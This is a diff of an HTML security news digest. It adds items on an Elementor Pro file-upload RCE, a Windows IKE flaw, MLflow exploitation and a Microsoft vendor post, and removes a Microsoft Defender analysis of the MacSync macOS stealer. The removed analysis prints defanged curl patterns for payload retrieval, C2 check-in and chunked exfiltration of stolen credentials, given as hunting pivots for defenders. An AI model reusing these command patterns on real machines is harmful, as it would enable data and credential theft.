@@ -59,12 +59,132 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-08-19</h1>
+        <h1>Security Briefing // 2026-08-20</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Attackers Exploit MLflow SSRF Flaw to Steal Cloud Credentials and Secrets</button></li><li><button onclick="show('art-1')">Hunting MacSync Stealer infrastructure through behavioral pivots</button></li><li><button onclick="show('art-2')">Staying Ahead of Adversarial AI Through Agentic Source Code Review</button></li><li><button onclick="show('art-3')">CISA: Windows Task Host flaw now exploited by ransomware gangs</button></li><li><button onclick="show('art-4')">CISA Flags Actively Exploited Ray Flaw That Can Trigger Browser-Based RCE</button></li><li><button onclick="show('art-5')">We've Seen This Movie: The OT/IT Technology Divide</button></li><li><button onclick="show('art-6')">Microsoft working on Defender patch for ShieldBreak zero-day</button></li><li><button onclick="show('art-7')">Who’s Tracking You? Use This New Service to Find Out</button></li><li><button onclick="show('art-8')">Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 1</button></li><li><button onclick="show('art-9')">Microsoft Patches a Record 570 Security Flaws</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Elementor Pro Flaw Could Let Unauthenticated Attackers Upload PHP and Execute Code</button></li><li><button onclick="show('art-1')">Rogue ransomware affiliate poses as recovery firm to steal payments</button></li><li><button onclick="show('art-2')">Microsoft named a Leader in the Frost Radar™: Cloud Workload Protection Platforms, 2026</button></li><li><button onclick="show('art-3')">AWSHound: An OpenSource AWS OpenGraph Collector</button></li><li><button onclick="show('art-4')">Critical RCE flaw in Windows IKE Extension now actively exploited</button></li><li><button onclick="show('art-5')">Attackers Exploit MLflow SSRF Flaw to Steal Cloud Credentials and Secrets</button></li><li><button onclick="show('art-6')">Staying Ahead of Adversarial AI Through Agentic Source Code Review</button></li><li><button onclick="show('art-7')">We've Seen This Movie: The OT/IT Technology Divide</button></li><li><button onclick="show('art-8')">Who’s Tracking You? Use This New Service to Find Out</button></li><li><button onclick="show('art-9')">Microsoft Plugs Nearly 400 Security Holes</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">Elementor Pro Flaw Could Let Unauthenticated Attackers Upload PHP and Execute Code</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/08/elementor-pro-flaw-could-let.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Cybersecurity researchers have disclosed details of a critical flaw in the Elementor Pro WordPress plugin that, if successfully exploited, could lead to remote code execution.
+The vulnerability, tracked as [CVE-2026-32475](https://www.cve.org/CVERecord?id=CVE-2026-32475), carries a CVSS score of 9.0 out of 10.0. It has been described as a case of unrestricted upload of a file with a dangerous type.
+"The flaw lives in the Forms module's File Upload field, where the extension check and the file-move step run in two separate loops with different handling of empty file entries," Patchstack [said](https://patchstack.com/articles/critical-unauthenticated-file-upload-to-rce-in-elementor-pro-plugin/).
+"By submitting two file parts for the same field, an unauthenticated attacker skips the extension blocklist entirely and writes a PHP file into a public directory."
+This discrepancy in how it validates the file's extension and moves the uploaded file to a public directory when empty file entries are processed turns a restricted file-upload field into an unauthenticated remote code execution primitive.
+Successful exploitation of the flaw could allow an attacker to upload arbitrary files, including PHP scripts, that could then be used to achieve remote code execution on affected systems. The security defect impacts all versions of the plugin prior to and including version 4.2.1.
+The WordPress security company said the only precondition required to pull off an attack is that the target site has at least one published Elementor page containing a Form widget with a File Upload field. The uploaded file is written as "wp-content/uploads/elementor/forms/<uniqid>.php," where "<uniqid>" is the output of PHP's [uniqid() function](https://www.php.net/manual/en/function.uniqid.php).
+"This is an extremely common, everyday configuration: job-application forms, 'attach a photo/ID/receipt' forms, and support-ticket attachments all use it," it noted. "The field's 'Required' toggle being off is its default state, so no hardened or unusual setting is needed."
+Security researcher Tin Pham (aka TF1T) has been credited with discovering and reporting the flaw under the Patchstack Bug Bounty Program. After the issue was reported to Elementor Pro on July 16, 2026, a patch (version 4.2.2) was released on August 19.
+The release comes a little over a week after WordPress [released 7.0.4](https://wordpress.org/news/2026/08/wordpress-7-0-4-release/) to address a high-severity security issue ([CVE-2026-65640](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8vr3-7mxf-gx8w), CVSS score: 8.8) that enables remote code execution via malicious Postscript file upload by an Author-level user or higher. It affects WordPress core versions 4.7 all the way up to 7.0.
+However, for the attack to be successful, two conditions have to be satisfied -
+- Imagick and Ghostscript in use on the server, given the issue is in Ghostscript's handling of certain embedded files
+- A malicious user with the upload_files capability
+The update "changes how WordPress hands your uploaded media to ImageMagick, and it closes a path that could let a logged-in author turn an ordinary-looking image upload into code execution on your server," Patchstack [said](https://patchstack.com/articles/when-a-png-isnt-a-png-wordpress-patches-an-author-level-imagick-rce/).
+"If you run a multi-author publication, a membership site, a client site with contributors, or anything with open or loosely managed registration, that bar is a lot lower than it sounds. On those sites, an Author uploading a booby-trapped 'image' is a genuinely realistic threat, not a theoretical one. If it's just you and a tightly held set of trusted editors, your exposure is smaller."
+The findings also coincide with the discovery of a large-scale operation dubbed [StopAndProtect](https://thehackernews.com/2026/08/stopandprotect-uses-nearly-2000-hacked.html) that's turning thousands of compromised WordPress websites into a distributed infrastructure for malware delivery, command-and-control communications, and the storage of stolen data.
+WordPress users are [advised](https://blog.sucuri.net/2024/09/how-do-website-owners-know-that-their-website-is-hacked.html) to keep their websites and plugins up-to-date, scan for unauthorized modifications that serve unexpected redirects or pop-ups, and audit them for unknown accounts and plugins.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Rogue ransomware affiliate poses as recovery firm to steal payments</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/rogue-ransomware-affiliate-ransom-busters-poses-as-recovery-firm/" target="_blank">Original Link</a></p>
+            <div class="content-text">A suspected ransomware affiliate is posing as a ransomware recovery service called "Ransom Busters," contacting the victims before the attacks become public and claiming to be able to provide decryption keys and delete stolen data for a fee. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Microsoft named a Leader in the Frost Radar™: Cloud Workload Protection Platforms, 2026</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/08/19/microsoft-named-a-leader-in-the-frost-radar-cloud-workload-protection-platforms-2026/" target="_blank">Original Link</a></p>
+            <div class="content-text">Security teams are overwhelmed with findings but still struggle to answer a simple question: which risks matter right now? A vulnerability alone is rarely the problem. The same vulnerability running in production, exposed through a misconfiguration or over-permissioned identity, is a real path to compromise. Organizations do not need longer lists of alerts. They need context that connects code, cloud resources, identities, and runtime activity so they can prioritize the issues that pose the greatest risk and stop cyberthreats before they reach production.
+As organizations adopt cloud-native architectures at scale, protecting workloads requires more than scanning. Today, 82% of container users run Kubernetes in production, making runtime visibility and protection critical for modern applications.1
+That change, from scanning workloads to protecting them where they run, is exactly what Frost & Sullivan describes in its [Frost Radar™: Cloud Workload Protection Platforms, 2026](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Frost%20Radar-CWPP%202026-Microsoft.pdf). Out of more than 45 qualified vendors, it benchmarked 20, and it found the category moving to a single runtime security model, one that ties together code, cloud, runtime, identity, and the security operations center (SOC).
+Within that market, Frost & Sullivan names Microsoft a visionary leader, its category for vendors that balance innovation with growth and help set the direction of the market. Microsoft is also the largest cloud workload protection platform (CWPP) provider by revenue, with an estimated share of more than 22% of the global CWPP market. In the analyst’s words:
+“Microsoft is positioned as a visionary leader in this analysis for its scale and breadth of [Microsoft] Defender for Cloud within a unified framework. The platform stands out for its breadth of coverage across infrastructure, workloads, identities, entitlements, data, and applications, and for its deep integration with Microsoft’s broader security ecosystem, allowing organizations to secure modern and AI-native application lifecycles, while reducing operational complexity.”
+Scale and breadth, in one framework. That is what customers are asking for, and it is where this category is heading.
+Why cloud workload protection is being redefined
+For a long time, protecting a workload meant scanning its image, fixing known vulnerabilities, and hardening configurations before deployment. That still matters. But it is no longer enough, because what looks safe before deployment can become exploitable once the workload is running.
+Most teams are also dealing with real sprawl. A modern estate spans several clouds and mixes containers, Kubernetes, serverless functions, microservices, and AI workloads. Every layer throws off its own signals, and those signals rarely connect on their own. One misconfiguration looks harmless until it sits next to an over-permissioned identity and a container that is already live. Then it is a path into production.
+The tools were not built for this. Posture sits in one console, workload scanning in another, detection in a third, and teams are left connecting them by hand, usually in the middle of an incident. What they need instead is one platform that can:
+- Bring posture, runtime, identity, and control-plane signals into one place.
+- Rank risk by what is truly exploitable, not by a severity score alone.
+- Stop risky workloads close to deployment, before they reach production.
+- Get what it finds at runtime to the developers and the SOC who can act on it.
+The market is moving the same way. Frost & Sullivan expects CWPP spending to grow from $6.43 billion in 2025 to about $7.95 billion in 2026, and 19.1% a year through 2030. That is teams voting with their budgets to modernize cloud security, meet regulation, and protect the workloads behind their apps, data, and AI services.
+What distinguishes leading platforms
+Frost & Sullivan scores vendors on two things: how fast they innovate and how fast they grow. But the report is blunt about something more telling: the bar for leadership has moved. It is now, in the analyst’s words:
+“Increasingly defined by runtime telemetry depth, container, and K8s security, workload behavior analysis, cloud-native threat detection, remediation and response automation, SOC integration, AI workload protection, and global go-to-market execution.”
+Put plainly, discovery, scanning, and compliance checklists no longer separate the leaders. Depth at runtime does. The platforms pulling ahead tend to share a few traits:
+- They cover real ground, from infrastructure and workloads to identities, data, and applications, without asking you to bolt five products together.
+- They go deep at runtime, not just posture and log review.
+- They carry cloud detection and response (CDR) straight into the SOC.
+- They connect code, cloud, and the SOC instead of treating each as its own island.
+- They span clouds with both agent and agentless coverage, and they are moving quickly on AI and data security.
+None of that is about longer findings lists. It is about context: seeing how the pieces connect and acting on the few that matter.
+How Microsoft helps organizations protect cloud workloads
+Microsoft’s capabilities address the problems customers raise most, and Frost & Sullivan points to the same strengths:
+“The strength in scaled runtime protection depth, strong CDR expansion, and ability to operationalize cloud runtime security across [Microsoft] Defender XDR, [Microsoft] Sentinel, GitHub, [Microsoft] Security Copilot, and the broader Microsoft security stack give Microsoft clearest advantages, particularly for large enterprises that already operate across Microsoft security, Azure infrastructure, GitHub, and Sentinel environments.”
+Here is what that looks like in practice, starting from the problem in each case.
+1. Protect workloads while they are running
+[Microsoft Defender for Cloud](https://www.microsoft.com/en-us/security/business/cloud-security/microsoft-defender-cloud) watches workloads while they run. A lightweight sensor (eBPF-based) picks up Kubernetes events, process activity, and network traffic, and detections map to MITRE ATT&CK, so alerts line up with real cyberattacker behavior. Most of the recent effort has gone into the container layer: DNS detection for Kubernetes on Azure AKS, Amazon EKS, and Google GKE; anti-malware that blocks rather than just alerts; runtime protection for EKS Bottlerocket; and drift blocking when a binary changes mid-run.
+Defender for Cloud can also act before a workload starts. Kubernetes’ gating applies policy at the cluster and namespace level, so a risky or non-compliant image is blocked before it ever starts. Frost & Sullivan calls this out as especially relevant to CWPP, because it puts preventive controls right next to production. That is the whole idea: catch a bad image before it becomes an incident, not after.
+2. Get runtime signal to the SOC
+Runtime signal only helps if it reaches the people who respond. With expanded CDR, Defender for Cloud ties runtime telemetry, Kubernetes audit data, process and network activity, control-plane events, and identity signals to specific workload incidents, then hands them to [Microsoft Defender XDR](https://www.microsoft.com/en-us/security/business/solutions/extended-detection-response-xdr) and [Microsoft Sentinel](https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-sentinel-siem). A suspicious process in a running cluster does not land as a lonely alert. It arrives already connected to the identity that launched it and the activity around it.
+For the SOC, that means faster answers and far less stitching signals together by hand.
+3. Send runtime findings back to the developers who can fix them
+Finding a problem at runtime is only half the work. Someone still has to fix it. Defender for Cloud links runtime context, exploitability, and attack-path detail to developer workflows through GitHub Advanced Security and Copilot Autofix, syncing both ways between security and development. A risk caught in production can go straight to the engineer who owns the code, get fixed at the source, and be checked afterward.
+The right issue reaches the right owner, and security and DevOps finally work from the same list.
+4. Extend protection to AI and across clouds
+More and more, the workloads worth protecting are AI. Defender for Cloud supports model scanning and threat protection, including prompt injection and suspicious access, for Azure AI Foundry and Azure OpenAI, and AI security posture management for Google Vertex AI and Amazon Bedrock. It spans Microsoft Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and hybrid environments with both agent and agentless coverage, and [Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot) adds guided investigation across the workflow.
+Protection follows the workload, whether that is a new AI service or a third cloud.
+What this signals for security leaders
+For anyone choosing a workload protection platform this year, the shift in this report changes the questions worth asking. The ones to put at the top:
+- Is workload protection part of one cloud security platform, or a separate tool wired onto the SOC after the fact?
+- Can it stop a risky workload before production, or only flag it afterward?
+- Does it connect runtime activity to identity, data, and control-plane context, and rank what is genuinely exploitable?
+- Do its findings reach both the SOC and the developers who can act on them?
+- Does it hold up across several clouds and AI workloads?
+The vendors that can answer “yes” are the ones shaping what comes next, and the Frost Radar places Microsoft among them.
+Bottom line
+Frost & Sullivan’s [Frost Radar™: Cloud Workload Protection Platforms, 2026](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Frost%20Radar-CWPP%202026-Microsoft.pdf) reinforces a clear shift. Cloud workload protection is leaving isolated scanning behind for runtime security that connects posture, identity, code, and the SOC. Frost & Sullivan positions Microsoft as a visionary leader, and the largest CWPP provider by revenue, because Defender for Cloud brings that range together in one framework, goes deep at runtime and in CDR, and plugs into the wider Microsoft security stack.
+Learn more
+- Read
+[Frost & Sullivan’s Frost Radar™: Cloud Workload Protection Platforms, 2026](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/bade/documents/products-and-services/en-us/security/Frost%20Radar-CWPP%202026-Microsoft.pdf)to see how leading vendors are evaluated and how the category is shifting toward unified cloud runtime security. - Explore
+[Microsoft cloud security solutions](https://www.microsoft.com/en-us/security/business/solutions/cloud-security)to see how unified posture management, risk prioritization, and protection across cloud and AI can help reduce risk.
+To learn more about Microsoft Security solutions, visit our [website.](https://www.microsoft.com/en-us/security/business) Bookmark the [Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.
+1[Kubernetes Established as the De Facto ‘Operating System’ for AI as Production Use Hits 82% in 2025 CNCF Annual Cloud Native Survey](https://www.prnewswire.com/news-releases/kubernetes-established-as-the-de-facto-operating-system-for-ai-as-production-use-hits-82-in-2025-cncf-annual-cloud-native-survey-302663249.html). PR Newswire, January 20, 2026.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">AWSHound: An OpenSource AWS OpenGraph Collector</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/08/19/awshound-opensource-aws-opengraph-collector/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>Daniel Heinsen and I have spent a lot of my time trying to answer one question inside AWS environments, usually in a hurry: “Starting from the access I have right now, where can I actually end up?” That turns out to be a hard question to answer in AWS. iam:SimulatePrincipalPolicy will evaluate one action, against [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/08/19/awshound-opensource-aws-opengraph-collector/">AWSHound: An OpenSource AWS OpenGraph Collector</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">Critical RCE flaw in Windows IKE Extension now actively exploited</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-critical-windows-ike-extension-flaw-now-exploited-in-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned that hackers are exploiting a critical-severity remote code execution (RCE) flaw in the Windows Internet Key Exchange (IKE) Service Extensions component. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Attackers Exploit MLflow SSRF Flaw to Steal Cloud Credentials and Secrets</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/08/attackers-exploit-mlflow-ssrf-flaw-to.html" target="_blank">Original Link</a></p>
             <div class="content-text">Two critical vulnerabilities impacting MLflow, an open-source artificial intelligence (AI) platform, and FUXA, an open-source, web-based SCADA / HMI software built for operational technology (OT) and industrial automation, are witnessing malicious scanning and exploitation efforts.
@@ -77,196 +197,14 @@ Organizations running MLflow are recommended to prioritize patching affected, ex
 As for CVE-2026-25895, VulnCheck said it detected malicious scanning aimed at the flaw starting August 18, 2026. A single IP address has been observed broadly scanning the internet for vulnerable FUXA instances. There are about 60 FUXA installations exposed to the public internet.
 "The attacker request attempts to overwrite main.js with junk data via the CVE-2026-25895 path traversal," Caitlin Condon, vice president of research at VulnCheck, [said](https://www.linkedin.com/posts/ccondon_kev-vulnerability-rce-share-7495432850213670913-KseT) in a LinkedIn post. "No RCE payloads dropped yet."
 Over the past year, two other vulnerabilities in FUXA – [CVE-2026-25939](https://nvd.nist.gov/vuln/detail/CVE-2026-25939) and [CVE-2023-33831](https://nvd.nist.gov/vuln/detail/CVE-2023-33831) – have also witnessed active exploitation efforts, with the latter witnessing activity "dating back to November 2025 and as recently as yesterday," per Condon.
+Update
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on August 19, 2026, [added](https://www.cisa.gov/news-events/alerts/2026/08/19/cisa-adds-one-known-exploited-vulnerability-catalog) CVE-2026-64849 to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 2, 2026.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Hunting MacSync Stealer infrastructure through behavioral pivots</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/08/18/hunting-macsync-stealer-infrastructure-through-behavioral-pivots/" target="_blank">Original Link</a></p>
-            <div class="content-text">MacSync Stealer is a macOS-focused information stealer that relies on changing infrastructure to deliver payloads, communicate with compromised devices, and exfiltrate data. Earlier [reporting](https://www.rstcloud.com/macsync-stealer-c2-infrastructure-rotation/) by RST Cloud identified the threat through a limited set of domains and documented rapid command-and-control (C2) replacement after public disclosure.
-Microsoft Defender Experts expanded that view by correlating recurring endpoints and network behaviors across the activity. This behavior-led approach connected more than 30 domains and showed that the infrastructure supported more than C2 communication, extending into active collection, staging, and exfiltration. The findings demonstrate that although domains may rotate quickly, repeated execution patterns, request characteristics, staging behavior, and upload methods provide defenders with more durable opportunities to investigate MacSync Stealer activity.
-Activity overview
-Microsoft Defender Experts reviewed endpoint and network telemetry to determine which MacSync Stealer behaviors persisted as infrastructure changed. The investigation followed the activity from C2 communication through collection, staging, and exfiltration, using recurring technical traits to connect activity across rotating domains. Execution began from an interactive shell session consistent with ClickFix social engineering, where users are tricked into pasting or running commands in Terminal. The shell session used curl to retrieve attacker-controlled payload content, followed by script-driven execution and outbound communication.
-After execution, the malware communicated with attacker-controlled infrastructure using recurring URI paths, macOS User-Agent strings, API-key headers, and curl command-line options. These request traits became durable behavioral pivots because they remained consistent even as domains changed. The activity then progressed into collection behavior targeting macOS Keychain material, browser data, locally stored credentials, cloud and Secure Shell (SSH) credentials, and sensitive files from common user directories.
-The investigation also confirmed active data exfiltration, not just beaconing. Collected data was staged under temporary paths, compressed into an archive, split into chunks, and uploaded through HTTP PUT requests using curl with the –data-binary argument. Upload parameters such as upload_id, chunk_index, and total_chunks provided additional hunting opportunities that could be correlated with process, command-line, file, and network telemetry across the attack chain.
-Discovery of additional rotating infrastructure
-To identify related MacSync Stealer infrastructure, Microsoft Defender Experts required multiple endpoint and network behaviors to align before treating a domain as connected. Correlation focused on recurring traits across payload retrieval, C2 check-in, and exfiltration, including process ancestry, command-line patterns, request paths, headers, and upload parameters. Applying this standard linked more than 30 domains, making the domain count an outcome of the behavioral methodology rather than the primary finding.
-The strongest pivots combined network request shape with endpoint execution context. Related infrastructure shared recurring URI patterns such as /curl/, /dynamic?txd=, and /gate?buildtxd=; curl command lines using -k, -s, –max-time, and –data-binary; macOS User-Agent strings; API-key headers; and HTTP PUT uploads that included upload_id, chunk_index, and total_chunks parameters. RST Cloud used recurring URI patterns to surface eleven additional candidate domains and found a static API-key value shared across four confirmed C2 domains while the build token rotated per deployment. Domains were treated as related when multiple behavioral traits aligned across process, command-line, and network telemetry, reducing reliance on any single domain indicator.
-This finding reinforces a practical defender lesson: rotating infrastructure can weaken static domain blocking and retrospective IOC matching, but repeated request patterns and process behaviors create durable hunting opportunities. Figure 1 shows representative defanged command-line patterns used as pivots across payload retrieval, C2 check-in, and chunked upload activity.
-| Phase | Representative behavioral pivot | Why it matters |
-| Payload retrieval | curl -kfsSL hxxp://[domain]/curl/[token] | Identifies the initial payload retrieval pattern without depending on a single domain. |
-| C2 check-in | curl -k -s –max-time 30 -H “User-Agent: Mozilla/5.0 (Macintosh…)” -H “api-key: **********” hxxp://[domain]/dynamic?txd=[token] | Combines endpoint command-line context with recurring request shape, headers, and URI paths. |
-| Chunked exfiltration | curl -k -s -X PUT –data-binary @- -H “api-key: **********” hxxp://[domain]/gate?buildtxd=[token] &upload_id=[id]&chunk_index=[n]&total_chunks=[n] | Shows active data exfiltration and provides durable upload parameters for hunting across domains. |
-Figure 1. Representative behavioral pivots associated with MacSync Stealer payload retrieval, C2 check-in, and chunked HTTP PUT exfiltration.
-The same behavioral patterns used to identify additional infrastructure also map to the broader end-to-end activity observed on affected macOS devices.
-Attack chain overview
-The observed MacSync Stealer activity followed a fast, script-driven attack chain designed to execute quickly on macOS, collect high-value local data, stage the results, and exfiltrate the archive through rotating web infrastructure. This sequence matters because each phase produces telemetry that can be correlated across processes, command-line, file, and network events. Rather than relying on any individual domain, defenders can track the chain through recurring execution tools, URI paths, staging locations, and upload parameters.
-| Phase | Observed behavior | Hunting value |
-| Payload retrieval | Interactive shell launches curl to retrieve staged payload content. | Correlate shell ancestry, curl command lines, and /curl/ retrieval paths. |
-| C2 check-in | Requests use recurring URI paths, macOS User-Agent strings, and API-key headers. | Track request shape across domains instead of matching domains alone. |
-| Collection and staging | Credential, browser, cloud, SSH, and user-file data is collected and archived. | Look for sensitive-file access followed by archive creation under temporary paths. |
-| Chunked exfiltration | curl uploads staged archive chunks using HTTP PUT and –data-binary. | Hunt for upload_id, chunk_index, total_chunks, and /gate?buildtxd= patterns. |
-| Cleanup | Temporary archives, staging folders, and lock files are removed. | Correlate deletion activity with preceding collection and outbound upload events. |
-Figure 2. MacSync Stealer attack chain showing payload retrieval, AppleScript-assisted execution, collection, staging, chunked exfiltration, and cleanup mapped to behavioral hunting opportunities.
-Phase 1: Initial access and payload execution
-Observed execution began from an interactive zsh terminal session, where curl retrieved payload content over a /curl/ path before the payload was decoded or unpacked using native utilities such as Base64 and gunzip. This phase is useful for hunting because the combination of user-facing shell activity, curl retrieval, and unpacking behavior is more durable than any single download domain.
-Phase 2: AppleScript-assisted execution
-The payload used [osascript](https://ss64.com/mac/osascript.html) to run AppleScript-assisted shell commands, blending macOS scripting with Unix command-line tooling. Observed activities included sh, cp, rm, curl, mkdir, and killall operations. This phase creates hunting value when osascript launches shell activity that quickly chains into network communication, staging, or cleanup behavior.
-Phase 3: Discovery and data collection
-After execution, the malware collected host and user information, enumerated running processes and system details, and checked for cryptocurrency wallet applications, including Ledger and Trezor-related local artifacts. It then targeted macOS Keychain material, browser Safe Storage keys, browser credentials, cookies, login databases, session data, IndexedDB, LevelDB, extension storage, Safari data, Apple Notes, SSH keys, AWS credentials, Kubernetes configurations, browser profiles, browsing history, and sensitive files from common user directories. The hunting value comes from correlating sensitive data access with the later staging and upload sequence.
-Phase 4: Data staging and compression
-Collected data was staged under /tmp/sync* paths and compressed into /tmp/osalogging.zip before uploading. The archive was split into multiple chunks, creating a repeatable staging and transfer pattern that defenders can correlate with preceding collection behavior and subsequent outbound curl traffic.
-Phase 5: Exfiltration over rotating infrastructure
-The staged archive was uploaded through rotating infrastructure using curl and HTTP PUT requests. Observed requests included –data-binary, API-key headers, macOS User-Agent string, upload_id values, chunk_index values, and total_chunks parameters. These upload traits confirmed active data exfiltration and provided durable hunting pivots even when domains rotated.
-Phase 6: Cleanup and evidence removal
-After exfiltration, the malware removed temporary archives, staging folders, lock files, and other artifacts. Although this cleanup reduced on-disk evidence, the sequence of archive creation, chunked upload, and deletion can still provide a useful behavioral correlation for defenders.
-Mitigation and protection guidance
-The attack chain findings point to three mitigation priorities.
-- Organizations should reduce the risk of user-initiated Terminal execution by educating users and using platform controls that interrupt suspicious paste-and-run workflows. Microsoft’s ClickFix reporting recommends educating users not to run commands from untrusted sources and monitoring suspicious Terminal or shell activity associated with these lures.
-- Defenders should monitor post-execution behavior when initial prevention does not stop activity, including suspicious shell usage, AppleScript-assisted commands, curl-based payload retrieval, credential-store access, temporary staging paths, and archive creation.
-- Detection should include exfiltration monitoring for HTTP PUT uploads, –data-binary usage, upload identifiers, chunk indexes, total chunk counts, and recurring /gate URI patterns that can reveal active data theft even when C2 domains rotate.
-In macOS 26.4 and later, Apple introduced protections designed to disrupt ClickFix-style attacks, including warnings that can block potentially malicious Terminal pastes and [XProtect](https://support.apple.com/guide/security/protecting-against-malware-sec469d47bd8/web) checks that can prevent detected malicious scripts from running.
-When a user attempts to paste a potentially malicious command into Terminal, macOS displays a warning that blocks the paste and explains that scammers may use Terminal instructions to compromise the Mac or the user’s privacy.
-“Possible malware, Paste blocked”
-“Your Mac has not been harmed. Scammers often encourage pasting text into Terminal to try and harm your Mac or compromise your privacy. These instructions are commonly offered via websites, chat agents, apps, files, or a phone call.”
-Organizations can also follow these recommendations to mitigate threats associated with this threat:
-- Reduce Terminal execution risk. Educate users not to paste or run Terminal commands from untrusted websites, chat messages, apps, files, or phone-based instructions.
-- Monitor suspicious Terminal usage. Alert on unusual Terminal, zsh, or shell sessions that retrieve payloads, decode content, or execute commands shortly after user interaction.
-- Detect native tool abuse. Flag unusual sequences of macOS utilities such as curl, Base64, gunzip, osascript, cp, rm, mkdir, and killall.
-- Hunt for post-execution behavior. Correlate AppleScript-assisted shell activity, curl-based payload retrieval, credential-store access, temporary staging paths, archive creation, and cleanup behavior.
-- Protect credential stores. Detect unauthorized access to Keychain material, browser credential stores, SSH keys, cloud credentials, and sensitive files in common user directories.
-- Monitor data staging. Alert on sensitive artifact collection followed by compression, archive creation, or staging under temporary paths such as /tmp/sync*.
-- Monitor exfiltration patterns. Identify curl-based HTTP PUT uploads that use –data-binary, API-key headers, upload_id, chunk_index, total_chunks, or recurring /gate URI patterns.
-- Restrict suspicious outbound traffic. Block or investigate connections to suspicious, newly registered, or behaviorally related domains while continuing to hunt on request patterns that may persist after domains rotate.
-Microsoft also recommends the following mitigations to reduce the impact of this threat.
-- Turn on
-[cloud-delivered protection](https://learn.microsoft.com/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus)in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown threats.
-[Enable network protection and web protection](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)to help prevent connections to malicious websites, phishing pages, and attacker-controlled infrastructure used for malware delivery, command-and-control communication, and data exfiltration.
-[Enable tamper protection](https://learn.microsoft.com/en-us/defender-endpoint/mac-preferences)to help prevent unauthorized changes to Microsoft Defender security settings and reduce the risk of attackers disabling or weakening endpoint protections.
-Microsoft Defender XDR detections
-Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
-Customers with provisioned access can also use [Microsoft Security Copilot in Microsoft Defender](https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender) to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
-| Tactic | Observed activity | Microsoft Defender coverage |
-| Execution | User-initiated shell activity retrieves payload content with curl. Payload content is decoded or unpacked using base64 and gunzip. AppleScript and shell commands are executed through osascript and native macOS utilities. | Microsoft Defender for Endpoint – Suspicious shell command execution – Obfuscation or deobfuscation activity – Executable permission added to file or directory – Suspicious AppleScript activity – Suspicious piped command launched – Suspicious file or information obfuscation detected Microsoft Defender Antivirus – Trojan:MacOS/SuspMalScript – Behavior:MacOS/SuspOsascriptExec – Behavior:MacOS/SuspDownloadFileExec – Behavior:MacOS/SuspiciousActivityGen |
